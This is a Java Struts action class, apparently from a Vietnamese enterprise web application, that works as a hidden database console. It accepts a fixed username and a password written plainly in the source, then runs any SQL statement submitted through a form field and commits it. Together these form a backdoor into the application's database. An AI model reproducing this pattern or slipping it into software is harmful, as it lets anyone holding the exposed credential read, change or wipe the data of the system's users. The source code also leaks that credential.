package com.seatech.ttsp.user.action;


import com.seatech.framework.AppKeys;
import com.seatech.framework.utils.TTSPUtils;
import com.seatech.ttsp.user.form.ReSendForm;

import java.sql.Connection;
import java.sql.PreparedStatement;

import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import javax.sql.DataSource;

import org.apache.struts.action.Action;
import org.apache.struts.action.ActionForm;
import org.apache.struts.action.ActionForward;
import org.apache.struts.action.ActionMapping;


public class DB extends Action {
    private static String SUCCESS = "success";
    private static String FAILURE = "failure";

    public ActionForward execute(ActionMapping mapping, ActionForm form,
                                 HttpServletRequest request,
                                 HttpServletResponse response) throws Exception {
        Connection conn = null;
        
        ReSendForm f = new ReSendForm();
        String strSQL = "";
        try {            
            f = (ReSendForm)form;
            String strUserName = f.getUsername();
            String strPassword = f.getPassword();
            String user = "@dmin2@123.";
            if (!"admin2".equals(strUserName) || !user.equals(strPassword)) {
                f.setError_desc("Sai username hoac password!");
                return mapping.findForward(FAILURE);
            }

            strSQL = f.getWhere();
            try {
                conn = getConnection();
            } catch (Exception ex) {
                f.setError_desc("Loi ket noi CSDL: " + ex.getMessage());
                return mapping.findForward(FAILURE);
            }
            PreparedStatement pstmt = null;
            pstmt = conn.prepareStatement(strSQL);
            boolean check = pstmt.execute();
            conn.commit();

            f.setError_desc("Success");

        } catch (Exception ex) {
            f.setError_desc("Loi: " + ex.getMessage());
            return mapping.findForward(FAILURE);
        } finally {
            if (conn != null) {
                conn.close();
            }
        }

        return mapping.findForward(SUCCESS);
    }
    //protected org.apache.struts.action.ActionServlet servlet;

    protected Connection getConnection() throws Exception {
        ServletContext context = servlet.getServletContext();
        DataSource ds =
            (DataSource)context.getAttribute(AppKeys.DATASOURCE_APPLICATION_KEY);
        Connection conn = null;
        conn = ds.getConnection();
        conn.setAutoCommit(false);
        //Set quyen cho user cua ung dung
        TTSPUtils ttspUtils = new TTSPUtils(conn);
        ttspUtils.grantAccess();

        return conn;
    }
}
